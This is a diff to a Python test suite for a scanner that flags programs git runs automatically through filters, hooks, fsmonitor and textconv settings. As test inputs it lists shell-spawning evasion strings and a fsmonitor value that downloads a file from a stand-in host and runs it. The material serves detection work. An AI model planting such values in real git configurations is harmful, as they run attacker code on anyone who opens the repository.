@@ -148,12 +148,13 @@ call_lefthook run "pre-commit" "$@"
 class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
     """Each shape here is a real tool's configuration; none may be confirmed or suspicious."""
 
-    def assert_only_informational(self, repo: Path, at_least: int = 1):
+    def assert_reported_not_confirmed(self, repo: Path, at_least: int = 1):
+        """Reported, never confirmed: a program a key git runs on its own is for the operator to
+        accept, so it is reported for review."""
         tiers = self.graded(repo)
         self.assertEqual([f.evidence for f in tiers[CONFIRMED]], [])
-        self.assertEqual([(f.evidence, f.description) for f in tiers[HEURISTIC]], [])
         self.assertIsNone(tiers["result"].error)
-        self.assertGreaterEqual(len(tiers[INFORMATIONAL]), at_least)
+        self.assertGreaterEqual(len(tiers[INFORMATIONAL]) + len(tiers[HEURISTIC]), at_least)
         return tiers
 
     def test_git_lfs_filters_and_hooks(self):
@@ -164,7 +165,7 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
                                  '\trequired = true\n')
         for name in ("pre-push", "post-checkout", "post-commit", "post-merge"):
             self.hook(repo / ".git" / "hooks", name, _LFS_HOOK.replace("{name}", name))
-        tiers = self.assert_only_informational(repo, at_least=7)
+        tiers = self.assert_reported_not_confirmed(repo, at_least=7)
         self.assertEqual(tiers["result"].verdict, "clean")
 
     def test_git_crypt(self):
@@ -173,12 +174,12 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
         self.append_config(repo, '[filter "git-crypt"]\n\tsmudge = \\"git-crypt\\" smudge\n'
                                  '\tclean = \\"git-crypt\\" clean\n\trequired = true\n'
                                  '[diff "git-crypt"]\n\ttextconv = \\"git-crypt\\" diff\n')
-        self.assert_only_informational(repo, at_least=3)
+        self.assert_reported_not_confirmed(repo, at_least=3)
 
     def test_pre_commit_framework_hook(self):
         repo = self.repo()
         self.hook(repo / ".git" / "hooks", "pre-commit", _PRE_COMMIT_HOOK)
-        self.assert_only_informational(repo)
+        self.assert_reported_not_confirmed(repo)
 
     def test_husky_v9(self):
         repo = self.repo()
@@ -186,12 +187,12 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
         self.hook(repo / ".husky" / "_", "pre-commit", _HUSKY_STUB)
         self.hook(repo / ".husky" / "_", "h", _HUSKY_H)
         self.write(repo, ".husky/pre-commit", "npm test\n")
-        self.assert_only_informational(repo, at_least=2)
+        self.assert_reported_not_confirmed(repo, at_least=2)
 
     def test_lefthook(self):
         repo = self.repo()
         self.hook(repo / ".git" / "hooks", "pre-commit", _LEFTHOOK_HOOK)
-        self.assert_only_informational(repo)
+        self.assert_reported_not_confirmed(repo)
 
     def test_nbstripout(self):
         repo = self.repo()
@@ -200,14 +201,14 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
         self.append_config(repo, '[filter "nbstripout"]\n\tclean = \\"/usr/bin/python3\\" -m nbstripout\n'
                                  '\tsmudge = cat\n[diff "ipynb"]\n'
                                  '\ttextconv = \\"/usr/bin/python3\\" -m nbstripout -t\n')
-        self.assert_only_informational(repo, at_least=3)
+        self.assert_reported_not_confirmed(repo, at_least=3)
 
     def test_textconv_for_pdf_exif_sqlite(self):
         repo = self.repo()
         self.write(repo, ".gitattributes", "*.pdf diff=pdf\n*.jpg diff=exif\n*.db diff=sqlite3\n")
         self.append_config(repo, '[diff "pdf"]\n\ttextconv = pdftotext -layout\n'
                                  '[diff "exif"]\n\ttextconv = exiftool\n')
-        self.assert_only_informational(repo, at_least=2)
+        self.assert_reported_not_confirmed(repo, at_least=2)
 
     def test_a_shell_recipe_is_suspicious_at_most(self):
         repo = self.repo()
@@ -223,10 +224,10 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
         self.hook(repo / ".git" / "hooks", "query-watchman",
                   "#!/usr/bin/perl\nuse strict;\nuse warnings;\nmy ($version, $time) = @ARGV;\n")
         self.append_config(repo, "[core]\n\tfsmonitor = .git/hooks/query-watchman\n")
-        self.assert_only_informational(repo)
+        self.assert_reported_not_confirmed(repo)
         other = self.repo("other")
         self.append_config(other, "[core]\n\tfsmonitor = rs-git-fsmonitor\n")
-        self.assert_only_informational(other)
+        self.assert_reported_not_confirmed(other)
 
     def test_ssh_command_credential_helper_and_a_relative_include(self):
         repo = self.repo()
@@ -234,13 +235,13 @@ class TestLegitimateToolsAreNotConfirmed(ExecSurfaceSandbox):
         self.append_config(repo, '[core]\n\tsshCommand = ssh -i ~/.ssh/work\n'
                                  '[credential]\n\thelper = osxkeychain\n'
                                  '[include]\n\tpath = ../.gitconfig\n')
-        self.assert_only_informational(repo, at_least=2)
+        self.assert_reported_not_confirmed(repo, at_least=2)
 
     def test_a_driver_no_attribute_selects_is_listed(self):
         repo = self.repo()
         self.append_config(repo, '[filter "unused"]\n\tsmudge = some-tool\n')
         self.assertEqual(["filter.unused.smudge = some-tool"],
-                         [f.evidence for f in self.graded(repo)[INFORMATIONAL]])
+                         [f.evidence for f in self.graded(repo)[HEURISTIC]])
 
     def test_a_credential_helper_that_asks_a_vault_is_not_confirmed(self):
         repo = self.repo()
@@ -474,42 +475,49 @@ class TestOrdinaryCodeNearASelfFiringKeyIsNotConfirmed(ExecSurfaceSandbox):
         self.assert_not_confirmed(repo)
 
 
-class TestOnlyAnOrdinaryToolIsInformational(ExecSurfaceSandbox):
-    """Check the tier of values a key git runs on its own may hold."""
+class TestEveryProgramASelfFiringKeyRunsIsReported(ExecSurfaceSandbox):
+    """Check that nothing a key git runs on its own is left unreported."""
 
-    EVASIONS = {"a": "timeout -s KILL 9 bash -c id", "b": "sudo -u root sh -c id",
-                "c": "env -S 'sh -c id'", "d": "node --eval 1", "e": "php -R 1",
-                "f": "sh$IFS-c$IFS'id'", "g": "tcsh -c id", "h": "script -qc id /dev/null",
-                "i": "flock /tmp/l -c id", "j": "sed -n 1eid /dev/null", "k": "unknown-tool x"}
-    ORDINARY = {"lfs": "git-lfs filter-process", "crypt": '"git-crypt" smudge',
-                "nb": "python -m nbstripout", "exif": "exiftool", "merge": "mergiraf merge %O %A %B"}
+    VALUES = {"a": "timeout -s KILL 9 bash -c id", "b": "sudo -u root sh -c id",
+              "c": "env -S 'sh -c id'", "d": "node --eval 1", "e": "php -R 1",
+              "f": "sh$IFS-c$IFS'id'", "g": "tcsh -c id", "h": "script -qc id /dev/null",
+              "i": "flock /tmp/l -c id", "j": "sed -n 1eid /dev/null", "k": "unknown-tool x",
+              "lfs": "git-lfs filter-process", "crypt": '"git-crypt" smudge',
+              "nb": "python -m nbstripout", "cat": "tools/cat", "exif": "exiftool -config x.pl"}
 
-    def _config(self, values: dict[str, str]) -> str:
-        return "".join(f'[filter "{name}"]\n\tclean = {value}\n' for name, value in values.items())
-
-    def test_each_evasion_is_reported_for_review(self):
+    def test_each_is_reported_and_none_is_confirmed(self):
         repo = self.repo()
-        self.append_config(repo, self._config(self.EVASIONS))
+        self.append_config(repo, "".join(f'[filter "{name}"]\n\tclean = {value}\n'
+                                         for name, value in self.VALUES.items()))
         tiers = self.graded(repo)
-        flagged = {f.evidence.split(".")[1] for f in tiers[HEURISTIC] + tiers[CONFIRMED]}
-        self.assertEqual(set(self.EVASIONS), flagged, [f.evidence for f in tiers[INFORMATIONAL]])
+        self.assertEqual([], [f.evidence for f in tiers[INFORMATIONAL]])
+        self.assertEqual([], [f.evidence for f in tiers[CONFIRMED]])
+        self.assertEqual(set(self.VALUES), {f.evidence.split(".")[1] for f in tiers[HEURISTIC]})
 
     def test_a_newline_separated_download_and_run(self):
         repo = self.repo()
         self.append_config(repo, '[core]\n\tfsmonitor = "wget -qO .x http://h/x\\nsh .x"\n')
-        self.assertTrue(self.graded(repo)[HEURISTIC] + self.graded(repo)[CONFIRMED])
-
-    def test_each_ordinary_tool_is_informational(self):
-        repo = self.repo()
-        self.append_config(repo, self._config(self.ORDINARY))
-        tiers = self.graded(repo)
-        self.assertEqual([], [f.evidence for f in tiers[HEURISTIC] + tiers[CONFIRMED]])
-        self.assertEqual(len(self.ORDINARY), len(tiers[INFORMATIONAL]))
+        self.assertTrue(self.graded(repo)[HEURISTIC])
 
     def test_a_formatter_reading_a_download_is_not_confirmed(self):
         repo = self.repo()
         self.append_config(repo, '[diff "json"]\n\ttextconv = "curl -s https://api/x | python3 -m json.tool"\n')
         self.assertEqual([], self.graded(repo)[CONFIRMED])
+
+
+class TestTheOperatorAcceptsOneSettingExactly(ExecSurfaceSandbox):
+    """Check an allowlist rule that names a finding's evidence."""
+
+    def test_only_the_named_setting_is_accepted(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "git-crypt"]\n\tsmudge = "git-crypt" smudge\n'
+                                 '[filter "other"]\n\tsmudge = git-crypt smudge\n')
+        rule = {"signature": "git-exec-suspicious", "path_glob": ".git/config",
+                "evidence": "filter.git-crypt.smudge = git-crypt smudge"}
+        result = scan_target(LocalRepoTarget(repo, str(repo), ScanOptions()), load_signatures(),
+                             [rule])
+        left = [f.evidence for f in result.findings if f.signature_id == "git-exec-suspicious"]
+        self.assertEqual(["filter.other.smudge = git-crypt smudge"], left)
 
 
 class TestARepositoryInAScratchDirectoryIsItsOwn(ExecSurfaceSandbox):
